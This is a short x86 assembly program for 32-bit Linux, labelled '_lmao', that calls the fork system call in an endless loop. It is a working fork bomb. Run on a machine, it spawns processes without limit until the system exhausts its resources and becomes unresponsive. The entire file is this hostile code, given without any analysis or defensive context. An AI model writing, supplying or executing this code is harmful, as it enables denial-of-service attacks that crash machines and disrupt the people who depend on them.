section .text
 global _lmao
 
_lmao:
 push byte 2
 pop eax 
 int 0x80 
 jmp short _lmao
